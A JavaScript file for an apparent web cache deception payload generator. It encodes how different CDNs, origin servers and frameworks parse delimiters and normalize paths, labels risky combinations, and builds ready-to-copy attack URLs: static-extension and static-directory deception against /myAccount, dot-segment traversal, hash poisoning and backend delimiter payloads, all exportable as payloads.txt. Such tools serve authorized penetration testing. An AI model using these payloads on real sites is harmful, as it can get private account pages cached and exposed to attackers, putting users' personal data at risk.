// main.js — shared logic for generator + docs (theme toggle, generator logic)
(function(){
  const STATIC_EXT = ['.js','.css','.png','.jpg','.jpeg','.svg','.woff','.woff2','.pdf'];
  const CDN_MAP = {cloudflare:{hash_delim:false,normalizes:false},cloudfront:{hash_delim:true,normalizes:true},gcp:{hash_delim:null,normalizes:false},azure:{hash_delim:true,normalizes:true},imperva:{hash_delim:false,normalizes:true},fastly:{hash_delim:false,normalizes:false},akamai:{hash_delim:null,normalizes:null}};
  const BACKEND_MAP = {apache:{hash_delim:'error',normalizes:true},nginx:{hash_delim:true,normalizes:false},iis:{hash_delim:'error',normalizes:true},gunicorn:{hash_delim:true,normalizes:true},openlite:{hash_delim:false,normalizes:false},puma:{hash_delim:true,normalizes:true}};
  const FRAMEWORK_MAP = {spring:{semicolon:true,dot:false},rails:{dot:true},django:{dot:false},flask:{dot:true},express:{dot:false},laravel:{dot:true}};

  // utilities
  function payloadStaticExt(user_path){const out=[];for(const ext of STATIC_EXT){out.push(user_path+'$aaa'+ext);out.push(user_path+'%24aaa'+ext);}return out}
  function payloadStaticDir(user_path){return [user_path+'$..%2Fstatic%2Fshell',user_path+'%24..%2Fstatic%2Fshell',user_path+'$..%2Fassets%2Fmain.js']}
  function payloadDotSegment(target){return ['/random/..%2F'+target.replace(/^\//,''),'/random/../'+target.replace(/^\//,''),'/tmp/.%2e/'+target.replace(/^\//,'')]}
  function payloadHashPoison(popular,poisoned){return [popular+'# '+poisoned,popular+'#%2F..%2F'+poisoned.replace(/^\//,''),popular+'#/..'+poisoned,popular+'#/../'+poisoned.replace(/^\//,'')]}
  function payloadBackendDelim(delim,target){return ['/backend'+delim+'../'+target.replace(/^\//,''),'/backend'+delim+'%2E%2E%2F'+target.replace(/^\//,'')]}

  function detectBehavior(cdn,backend,framework){
    const cdn_k = CDN_MAP[cdn]; const b_k = BACKEND_MAP[backend]; const f_k = FRAMEWORK_MAP[framework];
    const report = {cdn,backend,framework};
    if(cdn_k && b_k){
      const cdn_hash = cdn_k.hash_delim; const backend_hash = b_k.hash_delim;
      if(cdn_hash===true && backend_hash===true) report.hash='both-parsers-hash';
      else if(cdn_hash===false && backend_hash===true) report.hash='backend-hashes-cdn-ignores -> HIGH RISK';
      else if(cdn_hash===true && backend_hash===false) report.hash='cdn-hashes-backend-ignores -> unusual';
      else report.hash='unknown';
    } else report.hash='unknown';
    if(b_k && cdn_k){
      if(b_k.normalizes && !cdn_k.normalizes) report.dot='origin-normalizes,cdn-not -> static-dir vector';
      else if(!b_k.normalizes && cdn_k.normalizes) report.dot='cdn-normalizes,origin-not -> different vector';
      else report.dot='same or unknown';
    } else report.dot='same or unknown';
    report.framework_notes = [];
    if(f_k){ if(f_k.semicolon) report.framework_notes.push('spring-matrix-params: try semicolon'); if(f_k.dot) report.framework_notes.push('dot-as-format: static-ext tricks likely'); }
    return report;
  }

  // DOM helpers
  function by(id){return document.getElementById(id)}

  function generate(){
    const cdn = by('cdn')?by('cdn').value:'cloudflare';
    const backend = by('backend')?by('backend').value:'nginx';
    const framework = by('framework')?by('framework').value:'flask';
    const r = detectBehavior(cdn,backend,framework);
    const delims = ['%23 (encoded #)','# (fragment)','$ (dollar)','; (semicolon)','. (dot/format)','%00 (null)','%0A (newline)','%2E%2E (..)','%2F (slash encoded)','%5C (backslash encoded)'];
    if(by('delims')) by('delims').innerHTML = '<strong>Priority:</strong> '+delims.join(', ');
    if(by('norms')) by('norms').innerHTML = ['1) Base: GET /home','2) Encoded vs plain: GET /%68%6f%6d%65','3) Dot-seg: GET /aaa/../home','4) Encoded slash/backslash: /a%2F..%2Fhome'].join('<br>');
    if(by('fnotes')) by('fnotes').innerHTML = '<strong>Hash:</strong> '+r.hash+'<br><strong>Dot:</strong> '+r.dot + (r.framework_notes.length?('<br><strong>Framework:</strong> '+r.framework_notes.join('; ')):'');
    const payloads = [];
    payloads.push('-- Static extension deception --'); payloads.push(...payloadStaticExt('/myAccount'));
    payloads.push(''); payloads.push('-- Static directory deception --'); payloads.push(...payloadStaticDir('/myAccount'));
    payloads.push(''); payloads.push('-- Dot-segment tests --'); payloads.push(...payloadDotSegment('/home'));
    payloads.push(''); payloads.push('-- Hash/frame poisoning tests --'); payloads.push(...payloadHashPoison('/main.js','/home'));
    payloads.push(''); payloads.push('-- Backend delimiter tests --'); payloads.push(...payloadBackendDelim('$','/home'));
    if(by('payloadText')) by('payloadText').textContent = payloads.join('\n');
  }

  // theme toggle
  function toggleTheme(){ document.body.classList.toggle('theme-light'); document.body.classList.toggle('theme-dark'); localStorage.setItem('theme', document.body.classList.contains('theme-light')?'light':'dark'); }
  function initTheme(){ const t = localStorage.getItem('theme'); if(t==='light'){ document.body.classList.add('theme-light'); document.body.classList.remove('theme-dark'); } else { document.body.classList.add('theme-dark'); document.body.classList.remove('theme-light'); } }

  // event wiring
  window.addEventListener('load', ()=>{
    initTheme(); generate();
    const go = by('go'); if(go) go.addEventListener('click', generate);
    const reset = by('reset'); if(reset) reset.addEventListener('click', ()=>{ if(by('payloadText')) by('payloadText').textContent='(none)'; if(by('delims')) by('delims').innerHTML=''; if(by('norms')) by('norms').innerHTML=''; if(by('fnotes')) by('fnotes').innerHTML=''; });
    const copyAll = by('copyAll')||by('copyAll'); if(copyAll) copyAll.addEventListener('click', ()=>{ navigator.clipboard.writeText(by('payloadText').textContent||''); });
    const download = by('download'); if(download) download.addEventListener('click', ()=>{ const blob = new Blob([by('payloadText').textContent||''],{type:'text/plain'}); const url = URL.createObjectURL(blob); const a = document.createElement('a'); a.href=url; a.download='payloads.txt'; a.click(); URL.revokeObjectURL(url); });
    const themeBtn = by('themeToggle'); if(themeBtn) themeBtn.addEventListener('click', toggleTheme);
    const themeBtnDocs = by('themeToggleDocs'); if(themeBtnDocs) themeBtnDocs.addEventListener('click', toggleTheme);
  });
})();